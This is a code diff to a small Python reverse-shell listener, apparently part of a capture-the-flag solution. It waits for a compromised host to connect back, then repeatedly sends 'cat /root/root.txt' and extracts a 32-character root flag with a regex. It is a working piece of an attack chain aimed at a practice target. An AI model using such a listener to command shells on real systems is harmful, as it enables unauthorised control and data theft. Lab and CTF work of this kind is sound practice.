@@ -1,4 +1,6 @@
 import socket
+from time import sleep
+import re
 
 
 class Revsh(object):
@@ -12,18 +14,30 @@ class Revsh(object):
         self.s.listen(15)
 
         self.client_socket, self.client_address = self.s.accept()
+        sleep(5)
+        
 
     def send_command(self):
-        self.client_socket.send(b"\n")
-        _ = self.client_socket.recv(self.buffer_size).decode()
-        command = "cat /root/root.txt"
-        self.client_socket.send(command.encode("utf-8") + b"\n")
-        _ = self.client_socket.recv(self.buffer_size).decode()
-        self.client_socket.send(b"\n")
-
-        output = self.client_socket.recv(self.buffer_size).decode()
-        flag = output.split("\n")[1]
-        print(f"Root flag: {flag}")
+        print("Getting root flag")
+        
+        while True:
+            command = "cat /root/root.txt"
+            self.client_socket.send(command.encode("utf-8") + b"\n")
+            output = self.client_socket.recv(self.buffer_size).decode()
+            
+            flag = self.check_output_for_flag(output)
+            if flag:
+                print(f"Root flag: {flag}")
+                break
+            
+    def check_output_for_flag(self, output):
+        pattern = r'^[A-Za-z0-9]{32}$'
+        for i in output.split("\n"):
+            
+            if re.match(pattern, i):
+                return i
+                
+        return None
 
 
 if __name__ == "__main__":
